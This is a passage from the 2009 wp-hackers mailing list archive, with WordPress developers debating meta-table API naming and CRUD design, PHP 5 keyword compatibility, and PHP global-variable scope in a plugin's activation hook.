>> an explanation. Why not $id, instead? The problem is that it  
>> doesn't explain what the object part is, so it can be anything. It  
>> is the ID of the type you are looking for, so post, comment,  
>> category, etc. Why not just name it ID and leave out the question  
>> of what 'object' means. People understand what ID means.
>>
>> I'm not trying to argue against CRUD, I just wish another pattern  
>> or architecture was choosen for WordPress. CRUD is very simple and  
>> quick to implement. I just shudder every time I see it within  
>> WordPress and within my own code (papa doesn't like spending  
>> forever on "proper" design). Therefore, I'm trying to not argue  
>> CRUD in a wierd way, but still say it sucks and I very much hate it.
>>
>> Jacob Santos
>>
>> On Mon, 27 Jul 2009 03:17:30 +0300
>> scribu <scribu at gmail.com> wrote:
>>
>>> On Mon, Jul 27, 2009 at 12:21 AM, Jacob Santos <wordpress at santosj.name 
>>> >wrote:
>>>
>>>> CRUD in procedural form. Alas, it seems flawed somehow. The look,  
>>>> the feel;
>>>> The wonder about how to make it better. Is there such a solution?
>>>>
>>>> It seems a pity to look at something so beautiful in its  
>>>> simplicity and
>>>> then ask why? What purpose is there to mock something that should  
>>>> be so
>>>> clerished and loved and yet not provide another?
>>>>
>>>> Not that objects are any better, just better organized. A shame  
>>>> really.
>>>>
>>>> I do cry every time I see CRUD.
>>>>
>>>> Good work nevertheless. I hope you choose to name the parameters  
>>>> better.
>>>> There is a concept called, "Self-documenting Code" that is just  
>>>> plain
>>>> awesome in its beauty and soft skin.
>>>>
>>>> Jacob Santos
>>>>
>>>
>>>
>>> Thanks for the comment - very poetic, but not really helpful.
>>>
>>> Don't know how I could rename the parameters to be more self- 
>>> documenting
>>> than they already are. Metaphors maybe? :)
>>>
>>>
>>> -- 
>>> http://scribu.net
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
>> -- 
>> Jacob Santos <wordpress at santosj.name>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> -- 
> Jacob Santos <wordpress at santosj.name>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Mon Jul 27 15:08:07 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 27 Jul 2009 11:08:07 -0400
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907270442w2c9df133iaaa0180c792591bc@mail.gmail.com>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
	<20090726162155.d743ff96.wordpress@santosj.name>
	<349fe48b0907261717y11978be3h8105d0f82995e47a@mail.gmail.com>
	<20090726212420.b9c27ee8.wordpress@santosj.name>
	<349fe48b0907270442w2c9df133iaaa0180c792591bc@mail.gmail.com>
Message-ID: <C89DA76E-FB5D-42F8-818C-5D24D0517579@newclarity.net>

On Jul 27, 2009, at 7:42 AM, scribu wrote:

> I named it object_id because it was supposed to replace post_id and  
> user_id.
>
> wp_term_relationships also uses object_id.
>
> The only tables that use ID are wp_posts and wp_users.
>
> So object_id seemed more consistent.

+1

object_id is consistent with other similar uses in WordPress.

> Anyway, let's not bikeshed about this
> topic any further.

Ditto.


-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/





From mikeschinkel at newclarity.net  Mon Jul 27 15:25:04 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 27 Jul 2009 11:25:04 -0400
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <CEE6989D-B290-4447-B49D-949E2427515E@newclarity.net>
References: <20090726212420.b9c27ee8.wordpress@santosj.name>
	<23071988.3581248662119214.JavaMail.DELL-1405$@Dell-1405>
	<20090727021745.c76c5010.wordpress@santosj.name>
	<CEE6989D-B290-4447-B49D-949E2427515E@newclarity.net>
Message-ID: <1F56915B-5E0B-4633-9AE3-D5F7EEC4FD26@newclarity.net>

LOL, what a typo!

"When that pattern dies, " should have been "When that pattern does  
(emerge), "

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/




On Jul 27, 2009, at 10:57 AM, Mike Schinkel wrote:

> Thanks for that long answer, but I still did not hear a viable  
> alternate to CRUD, only some hypothetical panacea.
>
> In my development experience (which spans 20 years now) I've gone  
> from strong believing in abstracted solutions to learned belief that  
> abstraction for abstraction sake is bad and it's better to stay  
> closer to the metal unless and until a true pattern emerges. When  
> that pattern dies, it should ideally implement in the language (i.e.  
> the "foreach" iteration pattern vs. "for" with counter variables) or  
> it that can't happen then in language's library or lastly in a  
> framework like WordPress' core.  As far as I can see, the only true  
> pattern visible is CRUD.  Something better may come along but I have  
> yet to see it.
>
> Simpler is better.
>
> -Mike Schinkel
> WordPress Custom Plugins
> http://mikeschinkel.com/custom-wordpress-plugins/
>
>
>
>
> On Jul 27, 2009, at 3:17 AM, Jacob Santos wrote:
>
>> What is good is not requiring the user of the API to realize the DB  
>> table scheme or understand how the DB table works. I think the  
>> Taxonomy API is a good example, if the whole concept wasn't so  
>> difficult to understand in the first place. I think the better  
>> solution is to abstract the DB entirely from the API user and build  
>> the API that is built on top of it.
>>
>> The problem I have with CRUD, is that it forces the developer to  
>> know the DB scheme or at least understand the scheme. It seems to  
>> be taking the easy way out, "Well, I could create an API that  
>> doesn't force the developer using the API to know anything about  
>> the scheme, but meh, I lika the shiny and don't want to spend too  
>> much time developing something."
>>
>> In my experience, it requires the user of the API to know too much  
>> information is not important. Likewise, if the Scheme changes, then  
>> the API must change and all code that uses CRUD most change as  
>> well. If you are trying to create an API that doesn't require  
>> hassling the developer working on the API and the user of the API  
>> to keep up with the changes, then why use something that either  
>> puts the workload on the user ("Oh crap, the API breaks backward  
>> compatibility again because of scheme changes.") or on the  
>> developer ("Well, I could make refactor the design to where it  
>> doesn't suck, but doing so will either break backwards  
>> compatibility or cause me to work around a lot of my previous  
>> scheme and coding mistakes.").
>>
>> As for the proper solution, I've yet to find one that doesn't  
>> suffer from similar flaws or new ones. BREAD suffers from the same  
>> reasons of CRUD. I've discovered that the architecture should be a  
>> layer on top of the DB that abstracts the table scheme as well as  
>> any changes. Looking at how WordPress implements wp_insert_post()  
>> and wp_update_post(), I can say that that is far better than any  
>> design I've seen and have so far implemented. Actually, I have  
>> sinced strived to implement my APIs like wp_insert_post() and  
>> wp_update_post() in that inserting into tables uses CRUD or BREAD  
>> (I'm not so sure ORM or the others are any better or worse, just  
>> solves a different problem or the same problem differently).
>>
>> So the underlying DB implementation uses CRUD or BREAD or whatever  
>> pattern or fad everyone is using this year, but the API above it is  
>> not. So I suppose what I mean to say is that I'm not in favor of  
>> forcing the user of the API to use CRUD, but okay for the developer  
>> to do so in order to Get Shit Done and build an API that the user  
>> can understand quickly and easily.
>>
>> I think at the end of the day, if the choice is Getting Shit Done  
>> or Getting Shit Done right, which also means never, then I'll  
>> choose to have something rather than nothing. Which is why I keep  
>> having to kick myself in an attempt to not say anything stupid and  
>> take away from something that in all regards is actually pretty  
>> kick ass.
>>
>> Jacob Santos
>>
>>
>>
>> On Sun, 26 Jul 2009 21:41:30 -0500 (CDT)
>> Mike Schinkel <mikeschinkel at newclarity.net> wrote:
>>
>>> Jacob,
>>>
>>> I'm curious; if CRUD is bad, what is good?
>>>
>>> -Mike Schinkel
>>> Custom Wordpress Plugins
>>> http://mikeschinkel.com/custom-wordpress-plugins
>>>
>>> ----- Original Message -----
>>> From: "Jacob Santos" <wordpress at santosj.name>
>>> To: wp-hackers at lists.automattic.com
>>> Sent: Sunday, July 26, 2009 10:24:20 PM GMT -05:00 US/Canada Eastern
>>> Subject: Re: [wp-hackers] Meta tables: Take 5
>>>
>>> Well, I think it is fine, except for object_id doesn't really have  
>>> an explanation. Why not $id, instead? The problem is that it  
>>> doesn't explain what the object part is, so it can be anything. It  
>>> is the ID of the type you are looking for, so post, comment,  
>>> category, etc. Why not just name it ID and leave out the question  
>>> of what 'object' means. People understand what ID means.
>>>
>>> I'm not trying to argue against CRUD, I just wish another pattern  
>>> or architecture was choosen for WordPress. CRUD is very simple and  
>>> quick to implement. I just shudder every time I see it within  
>>> WordPress and within my own code (papa doesn't like spending  
>>> forever on "proper" design). Therefore, I'm trying to not argue  
>>> CRUD in a wierd way, but still say it sucks and I very much hate it.
>>>
>>> Jacob Santos
>>>
>>> On Mon, 27 Jul 2009 03:17:30 +0300
>>> scribu <scribu at gmail.com> wrote:
>>>
>>>> On Mon, Jul 27, 2009 at 12:21 AM, Jacob Santos <wordpress at santosj.name 
>>>> >wrote:
>>>>
>>>>> CRUD in procedural form. Alas, it seems flawed somehow. The  
>>>>> look, the feel;
>>>>> The wonder about how to make it better. Is there such a solution?
>>>>>
>>>>> It seems a pity to look at something so beautiful in its  
>>>>> simplicity and
>>>>> then ask why? What purpose is there to mock something that  
>>>>> should be so
>>>>> clerished and loved and yet not provide another?
>>>>>
>>>>> Not that objects are any better, just better organized. A shame  
>>>>> really.
>>>>>
>>>>> I do cry every time I see CRUD.
>>>>>
>>>>> Good work nevertheless. I hope you choose to name the parameters  
>>>>> better.
>>>>> There is a concept called, "Self-documenting Code" that is just  
>>>>> plain
>>>>> awesome in its beauty and soft skin.
>>>>>
>>>>> Jacob Santos
>>>>>
>>>>
>>>>
>>>> Thanks for the comment - very poetic, but not really helpful.
>>>>
>>>> Don't know how I could rename the parameters to be more self- 
>>>> documenting
>>>> than they already are. Metaphors maybe? :)
>>>>
>>>>
>>>> -- 
>>>> http://scribu.net
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>
>>> -- 
>>> Jacob Santos <wordpress at santosj.name>
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
>> -- 
>> Jacob Santos <wordpress at santosj.name>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From gaarai at gaarai.com  Mon Jul 27 15:43:48 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 27 Jul 2009 10:43:48 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907270630u52a7c706q6fdf8ce4c8c393c3@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
	<4A613671.8090104@gaarai.com> <4A613742.2040206@xavisys.com>
	<161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
	<4A6B5C42.2090100@intraffic.net>	<eccf48430907251349t35e3dae6pc7082ce8f88434a9@mail.gmail.com>
	<161617690907270630u52a7c706q6fdf8ce4c8c393c3@mail.gmail.com>
Message-ID: <4A6DCB34.8000903@gaarai.com>

PHP 5 does add new keywords. So, if you use keywords that don't exist in
PHP 4, the code will fail to compile even if it doesn't execute.

A few examples of keywords that don't exist in PHP 4 are try, catch,
public, goto, clone, instanceof, and namespace. You can find a full list
of keywords and their versions at http://bit.ly/EaCSz

If you aren't testing for PHP 4 compatibility and want to use fallback
errors as talked about, don't use any of the PHP 5+ keywords in any
files that are loaded.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Otto wrote:
> Fine, let me rephrase.
>
> As long as it is syntactically valid code, the parser won't throw up
> on it when turning it into bytecode. It doesn't have to be actual
> executable code, just valid enough that it can be parsed as PHP code.
>
> So your example won't work because the code is not correct syntax. On
> the other hand, this:
>
> test.php:
> <?php
> function complete_gibberish() {
>     this_is_complete_gibberish($full_of_all_sorts_of_errors);
> }
> echo 'hi';
>
> Works just fine. Even though it's calling an undefined function inside
> that function.
>
> Thus, having PHP 5 only code inside the file is fine, as it's got to
> be syntactically valid anyway. Having it in a separate file that you
> include is overkill.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From mikeschinkel at newclarity.net  Mon Jul 27 16:47:50 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 27 Jul 2009 11:47:50 -0500 (CDT)
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <24154394.3721248712974239.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <30620760.3741248713267705.JavaMail.DELL-1405$@Dell-1405>

> Why so large? I was thinking CHAR(20) at most.

Take a look at wp_postmeta and wp_usermeta; meta_key is VARCHAR(255).  I presumed the same for this.

Even so, ENUM is still a lot more efficient and it provides nice "documentation in code" for what types are valid.

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins

P.S. That said, maybe that is potential optimization that could improve all larger WordPress sites simply by bring down the meta_key sizes, maybe to 127 characters?  Of course, that might break some plugins with really long meta_keys.  Another options would be to move to wp_metakeys table with an INT primary key. That would really improve performance for sites with lots of meta records per object.

----- Original Message -----
From: "Otto" <otto at ottodestruct.com>
To: wp-hackers at lists.automattic.com
Sent: Monday, July 27, 2009 9:20:52 AM GMT -05:00 US/Canada Eastern
Subject: Re: [wp-hackers] Meta tables: Take 5

On Sat, Jul 25, 2009 at 1:48 AM, Mike
Schinkel<mikeschinkel at newclarity.net> wrote:
> That comfort comes with less than trivial performance implications.
> ...
> Now, let's look the option we'd choose it we didn't challenge the default
> assumptions: VARCHAR(255)..

Why so large? I was thinking CHAR(20) at most.

-Otto
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From wp at xentek.net  Mon Jul 27 21:33:47 2009
From: wp at xentek.net (Eric Marden)
Date: Mon, 27 Jul 2009 16:33:47 -0500
Subject: [wp-hackers] guide to importing things in intervals?
In-Reply-To: <4EF38082-F9CE-4BDD-87E6-3C260C981524@sillybean.net>
References: <4EF38082-F9CE-4BDD-87E6-3C260C981524@sillybean.net>
Message-ID: <C26905D2-57A7-43CF-B026-862F51658F50@xentek.net>

On Jul 26, 2009, at 5:59 PM, Stephanie Leary wrote:
> I'm working on the HTML file import plugin I talked about here a few  
> months ago. It's working nicely on small (<150) batches of files,  
> but I'd like to keep it from cutting short when it reaches the max  
> execution time. I'm looking through the core importers' code for  
> guidance.
>
> Does anyone happen to have any articles or documentation on how this  
> works?


These may help, but may not work in *every* environment reliably:
http://us2.php.net/manual/en/function.set-time-limit.php
http://www.php.net/manual/en/ini.core.php#ini.sect.resource-limits


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/






From adamjctaylor at gmail.com  Tue Jul 28 09:30:15 2009
From: adamjctaylor at gmail.com (Adam Taylor)
Date: Tue, 28 Jul 2009 10:30:15 +0100
Subject: [wp-hackers] register_activation_hook() problem
Message-ID: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>

Hi,

So I'm writing my first plugin and I've come across a problem, I'm hoping
it's very straightforward, I'm unfortunately not a php expert:

Here's my code snippet:

    global $thumbs;

    function thumbs_install() {
        $thumbs = new ThumbsUp();
        $thumbs->installThumbsUp();
    }

   register_activation_hook(__FILE__,'thumbs_install');

I found this discussion:
http://www.nabble.com/Odd-behaviour-when-using-classes-and-the-register_activation_hook()-function-td20826067.html<http://www.nabble.com/Odd-behaviour-when-using-classes-and-the-register_activation_hook%28%29-function-td20826067.html>and
I think it may be to do with my [mis]use of global variables in PHP -
not sure I've got my head around them properly.

Any pointers?

Thanks

-- 
adamjctaylor at gmail.com
http://www.twitter.com/adamtaylor

From if.website at gmail.com  Tue Jul 28 09:56:29 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 28 Jul 2009 04:56:29 -0500
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
Message-ID: <674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>

On Tue, Jul 28, 2009 at 4:30 AM, Adam Taylor<adamjctaylor at gmail.com> wrote:
> Here's my code snippet:
>
> ? ?global $thumbs;
>
> ? ?function thumbs_install() {
> ? ? ? ?$thumbs = new ThumbsUp();
> ? ? ? ?$thumbs->installThumbsUp();
> ? ?}

You want the global declaration inside of your function block instead:

>    function thumbs_install() {
>       global $thumbs;
>

> Any pointers?

You can learn about PHP variables here: <http://php.net/variables>

From yahgrp at poplarware.com  Tue Jul 28 13:55:53 2009
From: yahgrp at poplarware.com (Jennifer Hodgdon)
Date: Tue, 28 Jul 2009 06:55:53 -0700
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>
Message-ID: <4A6F0369.6000802@poplarware.com>

Austin Matzko wrote:
> On Tue, Jul 28, 2009 at 4:30 AM, Adam Taylor<adamjctaylor at gmail.com> wrote:
>> Here's my code snippet:
>>
>>    global $thumbs;
>>
>>    function thumbs_install() {
>>        $thumbs = new ThumbsUp();
>>        $thumbs->installThumbsUp();
>>    }
> 
> You want the global declaration inside of your function block instead:

It is definitely true that you need the global declaration inside your 
function. But specifically for activation, you may need to also leave 
the global declaration outside the function block as well. I've run 
into problems with activation in WP, and needed to do things like this 
in the main body of the plugin:
   global $wpdb;
   global $mymodulevariable = 12234;
in order to get activation functions to work correctly.

     --Jennifer

-- 
Jennifer Hodgdon * Poplar ProductivityWare
www.poplarware.com
Drupal, WordPress, and custom Web programming


From adamjctaylor at gmail.com  Tue Jul 28 14:56:17 2009
From: adamjctaylor at gmail.com (Adam Taylor)
Date: Tue, 28 Jul 2009 15:56:17 +0100
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <4A6F0369.6000802@poplarware.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com> 
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com> 
	<4A6F0369.6000802@poplarware.com>
Message-ID: <d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>

On Tue, Jul 28, 2009 at 2:55 PM, Jennifer Hodgdon <yahgrp at poplarware.com>wrote:

> Austin Matzko wrote:
> It is definitely true that you need the global declaration inside your
> function. But specifically for activation, you may need to also leave the
> global declaration outside the function block as well. I've run into
> problems with activation in WP, and needed to do things like this in the
> main body of the plugin:
>  global $wpdb;
>  global $mymodulevariable = 12234;
> in order to get activation functions to work correctly.
>
>    --Jennifer
>

I've tried:

    global $thumbs;
    $thumbs = new ThumbsUp();

    function thumbs_install() {

        //$thumbs = new ThumbsUp();
        $thumbs->installThumbsUp();
    }

    global $thumbs;

    function thumbs_install() {

        $thumbs = new ThumbsUp();
        $thumbs->installThumbsUp();
    }

And


    function thumbs_install() {

        global $thumbs;

        $thumbs = new ThumbsUp();
        $thumbs->installThumbsUp();
    }

And they *all* produce the same error:

*Fatal error*: Cannot redeclare thumbs_install() (previously declared in
/dev/site/wp-content/plugins/thumbs-up/thumbs-up.php:163) in *
/dev/site/wp-content/plugins/thumbs-up/thumbs-up.php* on line *164*

Saying that it does still activate the plugin.
-- 
adamjctaylor at gmail.com
http://www.twitter.com/adamtaylor

From if.website at gmail.com  Tue Jul 28 15:54:09 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 28 Jul 2009 10:54:09 -0500
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>
Message-ID: <674b4a3b0907280854g7e0335f9jdb3430e903b09a61@mail.gmail.com>

On Tue, Jul 28, 2009 at 9:56 AM, Adam Taylor<adamjctaylor at gmail.com> wrote:
> And they *all* produce the same error:
>
> *Fatal error*: Cannot redeclare thumbs_install() (previously declared in
> /dev/site/wp-content/plugins/thumbs-up/thumbs-up.php:163) in *
> /dev/site/wp-content/plugins/thumbs-up/thumbs-up.php* on line *164*
>
> Saying that it does still activate the plugin.

This kind of error upon activation sometimes indicates a problem with
syntax, but it's not possible to know exactly what without seeing the
rest of the code.

From gaarai at gaarai.com  Tue Jul 28 15:54:43 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Tue, 28 Jul 2009 10:54:43 -0500
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>
Message-ID: <4A6F1F43.4080709@gaarai.com>

Your error is caused by the fact that the thumbs_install function is
being redeclared, not by your use of the global declaration. You can
only define a function once, attempting to do so again will result in an
error.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Adam Taylor wrote:
> On Tue, Jul 28, 2009 at 2:55 PM, Jennifer Hodgdon <yahgrp at poplarware.com>wrote:
>
>   
>> Austin Matzko wrote:
>> It is definitely true that you need the global declaration inside your
>> function. But specifically for activation, you may need to also leave the
>> global declaration outside the function block as well. I've run into
>> problems with activation in WP, and needed to do things like this in the
>> main body of the plugin:
>>  global $wpdb;
>>  global $mymodulevariable = 12234;
>> in order to get activation functions to work correctly.
>>
>>    --Jennifer
>>
>>     
>
> I've tried:
>
>     global $thumbs;
>     $thumbs = new ThumbsUp();
>
>     function thumbs_install() {
>
>         //$thumbs = new ThumbsUp();
>         $thumbs->installThumbsUp();
>     }
>
>     global $thumbs;
>
>     function thumbs_install() {
>
>         $thumbs = new ThumbsUp();
>         $thumbs->installThumbsUp();
>     }
>
> And
>
>
>     function thumbs_install() {
>
>         global $thumbs;
>
>         $thumbs = new ThumbsUp();
>         $thumbs->installThumbsUp();
>     }
>
> And they *all* produce the same error:
>
> *Fatal error*: Cannot redeclare thumbs_install() (previously declared in
> /dev/site/wp-content/plugins/thumbs-up/thumbs-up.php:163) in *
> /dev/site/wp-content/plugins/thumbs-up/thumbs-up.php* on line *164*
>
> Saying that it does still activate the plugin.
>   

From adamjctaylor at gmail.com  Tue Jul 28 16:01:00 2009
From: adamjctaylor at gmail.com (Adam Taylor)
Date: Tue, 28 Jul 2009 17:01:00 +0100
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <4A6F1F43.4080709@gaarai.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com> 
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com> 
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com> 
	<4A6F1F43.4080709@gaarai.com>
Message-ID: <d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>

On Tue, Jul 28, 2009 at 4:54 PM, Chris Jean <gaarai at gaarai.com> wrote:

> Your error is caused by the fact that the thumbs_install function is
> being redeclared, not by your use of the global declaration. You can
> only define a function once, attempting to do so again will result in an
> error.
>

I'm pretty sure I haven't defined the function more than once.. the whole
code is here:

http://pastebin.com/m1feb2d16

If that helps anyone help me..

From if.website at gmail.com  Tue Jul 28 16:18:33 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 28 Jul 2009 11:18:33 -0500
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>
	<4A6F1F43.4080709@gaarai.com>
	<d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>
Message-ID: <674b4a3b0907280918i5c9f1aeek468eb31c1aa065b6@mail.gmail.com>

On Tue, Jul 28, 2009 at 11:01 AM, Adam Taylor<adamjctaylor at gmail.com> wrote:
> I'm pretty sure I haven't defined the function more than once.. the whole
> code is here:
>
> http://pastebin.com/m1feb2d16

The problem is that the createDatabaseTables() method calls
$wpdb->get_var() without declaring $wpdb as a global variable, so the
error is calling a method that doesn't exist.

So line 62 needs global $wpdb, like so:

...
function createDatabaseTables() {
   global $wpdb;
...

From mike at zed1.com  Tue Jul 28 16:18:36 2009
From: mike at zed1.com (Mike Little)
Date: Tue, 28 Jul 2009 17:18:36 +0100
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com> 
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com> 
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com> 
	<4A6F1F43.4080709@gaarai.com>
	<d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>
Message-ID: <7235ce780907280918o7405e3e7he78120ceecc1511a@mail.gmail.com>

2009/7/28 Adam Taylor <adamjctaylor at gmail.com>:

> I'm pretty sure I haven't defined the function more than once.. the whole
> code is here:
>
> http://pastebin.com/m1feb2d16
>
> If that helps anyone help me..

You can create your install function on the fly like this:

register_activation_hook(__FILE__, create_function('', 'global
$thumbs; $thumbs = new ThumbsUp; $thumbs->installThumbsUp();'));

(all on one line)


Mike
-- 
Mike Little
http://zed1.com/

From gaarai at gaarai.com  Tue Jul 28 16:21:12 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Tue, 28 Jul 2009 11:21:12 -0500
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>
	<4A6F0369.6000802@poplarware.com>	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>
	<4A6F1F43.4080709@gaarai.com>
	<d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>
Message-ID: <4A6F2578.4050100@gaarai.com>

In that code, I did not see a redefinition. However, if you have other
plugins, theme mods, etc that define that function, you will still have
problems. Keep in mind that redefinition isn't limited to a file, it
applies to all code that runs.

Looking at your code, it is clear that you still need to learn how
globals work. The code fatally failed because you didn't have "global
$wpdb" inside the createDatabaseTables function. Also, thumbs_install,
thumbs_init, and process_vote will not use the $thumbs global thumbs var
as you want since the global var is not localized to the functions.

Scope is really odd in PHP; frankly, I don't like how it works. So,
forget everything you knew about scope in other languages and learn how
PHP does it.

When you create a function, you create a new scope completely-unique to
that function. Nothing exists to that function except what is passed to
it as an argument or what is created inside of it. Even though a
variable may be global, it does not exist inside any function.

The way you bring a global into the function is to use the global
keyword to bring the global variable into the function's scope.

For example, doing the following will not work:

    global $var;
    $var = "Hello!\n";
    test();

    function test() {
        echo $var;
    }

The function test creates a new empty variable called $var and echoes
it's value rather than using the global. Running the code will result in
a warning: "PHP Notice:  Undefined variable: var in ..."

This is the right way to do it:

    global $var;
    $var = "Hello!\n";
    test();

    function test() {
        global $var;
        echo $var;
    }

You can read more on globals here: http://bit.ly/18fGqF

With all this said, I recommend that you avoid globals if you can.
Passing variables as arguments or storing them in objects is a
less-confusing and less bug-prone way of doing things.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Adam Taylor wrote:
> On Tue, Jul 28, 2009 at 4:54 PM, Chris Jean <gaarai at gaarai.com> wrote:
>
>   
>> Your error is caused by the fact that the thumbs_install function is
>> being redeclared, not by your use of the global declaration. You can
>> only define a function once, attempting to do so again will result in an
>> error.
>>
>>     
>
> I'm pretty sure I haven't defined the function more than once.. the whole
> code is here:
>
> http://pastebin.com/m1feb2d16
>
> If that helps anyone help me..
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
